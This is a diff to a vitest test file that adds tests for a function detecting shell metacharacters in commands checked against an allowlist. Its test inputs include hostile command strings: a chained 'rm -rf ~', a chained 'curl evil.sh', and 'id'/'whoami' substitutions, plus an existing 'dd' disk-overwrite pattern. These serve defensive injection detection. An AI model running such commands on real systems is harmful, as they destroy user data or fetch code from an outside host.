@@ -6,7 +6,7 @@
  */
 
 import { describe, it, expect } from "vitest";
-import { matchesPattern, findMatchingPattern, normalizeCommand } from "../allowlist-pattern.js";
+import { matchesPattern, findMatchingPattern, normalizeCommand, containsShellMetachars } from "../allowlist-pattern.js";
 
 describe("allowlist-pattern", () => {
   describe("normalizeCommand", () => {
@@ -92,6 +92,36 @@ describe("allowlist-pattern", () => {
 
     it("matches dd if=* of=/dev/*", () => {
       expect(matchesPattern("dd if=* of=/dev/*", "dd if=/dev/zero of=/dev/sda")).toBe(true);
+    });
+  });
+
+  describe("containsShellMetachars", () => {
+    it("detects pipe", () => {
+      expect(containsShellMetachars("echo foo | cat")).toBe(true);
+    });
+
+    it("detects semicolon", () => {
+      expect(containsShellMetachars("pnpm test ; rm -rf ~")).toBe(true);
+    });
+
+    it("detects && chain", () => {
+      expect(containsShellMetachars("git status && curl evil.sh")).toBe(true);
+    });
+
+    it("detects backtick substitution", () => {
+      expect(containsShellMetachars("echo `whoami`")).toBe(true);
+    });
+
+    it("detects $() substitution", () => {
+      expect(containsShellMetachars("echo $(id)")).toBe(true);
+    });
+
+    it("returns false for clean command", () => {
+      expect(containsShellMetachars("pnpm test")).toBe(false);
+    });
+
+    it("returns false for git log --oneline", () => {
+      expect(containsShellMetachars("git log --oneline")).toBe(false);
     });
   });
 
